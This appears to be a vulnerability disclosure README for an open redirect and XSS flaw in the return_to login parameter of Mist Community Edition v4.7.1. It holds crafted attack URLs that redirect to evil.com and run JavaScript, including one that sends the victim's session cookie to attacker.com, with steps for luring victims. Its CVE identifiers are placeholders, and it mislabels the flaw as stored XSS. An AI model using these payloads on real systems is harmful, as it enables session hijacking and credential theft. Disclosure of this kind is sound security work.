# CVE-2025-MIST-REDIRECT-XSS  
## Open Redirect Leading to XSS and Malicious Site Redirects

## 📜 Description
**Mist Community Edition (CE) v4.7.1** contains an **Open Redirect** vulnerability within its authentication system, which can be exploited to execute **Cross-Site Scripting (XSS)** attacks or **redirect** users to arbitrary sites. This flaw exists in the `return_to` parameter, responsible for controlling post-login redirection. Attackers can craft malicious login URLs that either redirect users to phishing sites to steal credentials or inject malicious JavaScript that runs within the user's browser context, leading to session hijacking or information theft.

## 📌 Affected Version
- Mist Community Edition (CE) v4.7.1
- Other versions prior to v4.7.1 may also be affected

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## 💻 Exploit Details

### 🔹 **Exploiting Open Redirect for Phishing or Malicious Site Redirects**
By crafting a malicious login URL, an attacker can trick users into authenticating on Mist and then redirect them to an external phishing site designed to steal credentials. The following example demonstrates such an attack:

```
http://example.com/sign-in?return_to=http://evil.com
```

After login, the victim is redirected to `http://evil.com`, where an attacker may host a fake Mist login page to harvest credentials.

### 🔹 **Exploiting Open Redirect for XSS**
The vulnerability also allows for direct **JavaScript execution** via the `return_to` parameter, leading to stored XSS attacks. An attacker can craft a URL that executes arbitrary JavaScript in the victim’s browser:

```
http://example.com/sign-in?return_to=javascript:alert(document.cookie);
```

Upon authentication, this payload triggers an alert displaying the victim’s session cookie.
## 🛠️ Steps to Reproduce

### 1️⃣ Open Redirect Exploit
1. Navigate to Mist’s login page and intercept the request.
2. Modify the `return_to` parameter to point to a malicious site (`http://evil.com`).
3. Send the crafted URL to a victim and persuade them to log in.
4. Upon authentication, they are redirected to the attacker's website.

### 2️⃣ XSS Exploit via Open Redirect
1. Craft a malicious login URL using a JavaScript payload:
   ```
   http://example.com/sign-in?return_to=javascript:fetch('http://attacker.com/cookie/'+document.cookie);
   ```
2. Send the URL to a victim.
3. Upon login, their session cookie is sent to the attacker’s C2 server (`http://attacker.com`).

## 🎬 Demonstration Video

<a href="https://www.youtube.com/watch?v=GLZ9JikmWVE" target="_blank">
  <img src="https://img.youtube.com/vi/GLZ9JikmWVE/maxresdefault.jpg"/>
</a>

## 🧑‍💻 Discovery
The **CVE-2025-XXXX** vulnerability was discovered by **Alex Perrakis (Stolichnayer)**.

## 🔗 **References:**
- [Mist CE Github Repository](https://github.com/mistio/mist-ce)

